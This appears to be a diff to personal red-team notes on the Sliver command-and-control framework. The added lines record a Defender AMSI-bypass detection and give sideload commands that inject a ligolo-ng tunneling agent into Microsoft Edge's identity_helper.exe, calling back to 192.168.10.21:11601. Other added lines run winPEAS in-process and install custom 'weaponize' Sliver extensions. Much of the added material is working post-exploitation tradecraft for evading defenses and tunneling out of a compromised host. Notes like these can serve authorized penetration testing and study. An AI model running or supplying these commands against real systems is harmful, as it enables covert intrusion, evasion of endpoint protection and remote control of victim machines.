@@ -39,6 +39,13 @@ directory, we need to escape the backslash character) `upload pwn.exe C:\\temp\\
 
 
 ## Builtin execution commands
+### Opsec
+It seems that defender is catching AMSI bypass
+```
+Behavior:Win32/AMSI_Patch_T.B12
+behavior: process: C:\Windows\System32\rundll32.exe, pid:6236:1206935659933107
+```
+
 ### Introduction and common flags
 * `execute`: 
 * `execute-assembly`: `.NET` binary or dll
@@ -109,11 +116,18 @@ As `execute-assembly`, it use `Donut` to turn the payload into shellcode and the
 
 Creating a process from a PE file is easy if the file is on disk since Windows is obviously made for that. Creating one from a PE file in memory is not supported though. `Donut` solves this by implementing its own `PE loader` which recreates the Windows loader functionality (or at least the most important parts of it).
 
+
+`identity_helper.exe` Enable PWA Integration with Windows Shell in Microsoft Edge
 ```bash
 # dll
 sideload --entry-point <entry_point> [flags] <filepath> [args...]
 # exe
 sideload  [flags] <filepath> [args...]
+sideload -k --loot --process "C:\Program Files (x86)\Microsoft\Edge\Application\<version>\identity_helper.exe" /home/jubeaz/tmp/ligolo-ng-agent.exe -ignore-cert -connect 192.168.10.21:11601
+sideload -k --loot --process "C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.90\identity_helper.exe" /home/jubeaz/tmp/ligolo-ng-agent.exe -ignore-cert -connect 192.168.10.21:11601
+# run winpeas (ne produit pas de sortie)
+sideload -t 600 -s --process "C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.90\identity_helper.exe" /opt/windows/windows_weaponize/bin/winPEASx86_ofs.exe 
+
 ```
 
 
@@ -173,6 +187,13 @@ To implement the sliver API two functions must be created:
 
 * a `callback` used to communicate output to the implant: `typedef int (*goCallback)(char*, int)`
 * an `entrypoint` to start the extension, to which you can give any name you like and which accepts a string of arguments, its length and the callback: `int <name>(char* argsBuffer, uint32_t bufferSize, goCallback callback)`
+
+```bash
+#mkdir -p  /home/jubeaz/.sliver-client/extensions/jubeaz  && cp *.dll /home/jubeaz/.sliver-client/extensions/jubeaz &&  cp extension.json /home/jubeaz/.sliver-client/extensions/jubeaz
+extensions install /mnt/nfs/jubeaz/dev/windows_weaponize/extensions/x64/Release
+extensions load /home/jubeaz/.sliver-client/extensions/jubeaz
+# extensions install /mnt/nfs/jubeaz/dev/windows_weaponize/extensions/x64/Release/template.dll Execute
+```
 
 ```cpp
 
